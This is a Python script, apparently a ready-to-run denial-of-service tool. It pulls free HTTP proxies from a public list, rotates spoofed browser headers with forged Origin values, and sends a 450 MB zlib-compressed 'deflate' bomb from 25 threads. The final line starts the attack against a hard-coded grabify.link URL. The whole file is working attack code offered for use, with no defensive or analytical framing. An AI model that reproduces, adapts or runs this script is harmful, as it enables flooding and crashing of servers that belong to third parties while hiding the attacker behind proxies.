import threading
import requests
import random
import json
import time
import zlib

class Primary:

    def __init__(self, Website:str, Amount:int, Workers:int):

        self.Website = Website
        self.Amount = Amount
        self.Workers = Workers
        self.Proxies = self.GetProxies()
        self.Payload = zlib.compress(b"A" * int(450 * 1024 * 1024))


    def GetProxies(self):

        ProxiesProvider = "https://www.proxy-list.download/api/v1/get?type=http"
        return requests.get(ProxiesProvider).text.splitlines()
    
    def Headers(self):

        Headers_ = [
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.5",
                "Connection": "keep-alive", 
                "Upgrade-Insecure-Requests": "1",
                'Content-Encoding': 'deflate',
                "Cache-Control": "max-age=0",
                "Origin": "https://openai.com",
                "TE": "Trailers"
            },

            {
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-US,en;q=0.9",
                'Content-Encoding': 'deflate',
                "Connection": "keep-alive",
                "Cache-Control": "max-age=0",
                "X-Requested-With": "XMLHttpRequest",
                "Origin": "https://youtube.com",
                "Referer": "https://youtube.com/youtube",
                "DNT": "1",
            },

            {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Accept": "application/xml, text/xml, */*; q=0.01",
                "Accept-Encoding": "gzip, deflate, br",
                'Content-Encoding': 'deflate',
                "Accept-Language": "en-GB,en;q=0.9",
                "Connection": "keep-alive",  
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0",
                "X-Forwarded-For": "192.168.1.1", 
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Content-Type-Options": "nosniff"
            }
        ]

        return random.choice(Headers_)
        
    def Attack(self):
        
        try:

            for _ in range(self.Amount):

                Proxy = random.choice(self.Proxies)
                Response = requests.get(self.Website, proxies={"http": f"http://{Proxy}"}, headers=self.Headers(), data=self.Payload)
                
                print(f"{Proxy} sent a request to {self.Website} with a status code of {Response.status_code}")
        except:

            pass

    def Main(self):
        
        try:

            StartTime = time.time()

            print(f"Starting attack at {StartTime}. Current worker amount: {self.Workers}, inbound to send a total of {self.Amount} requests.")
            
            Threads = []

            for _ in range(self.Workers):

                Thread = threading.Thread(target=self.Attack)
                Thread.start()
                Threads.append(Thread)

            for Thread in Threads:

                Thread.join()

            print(f"Sent {self.Amount} requests using {self.Workers} workers within {time.time()-StartTime:.2f} seconds to {self.Website}.")

        except:

            pass

Primary("https://grabify.link/5FGLTQ", 1000, 25).Main()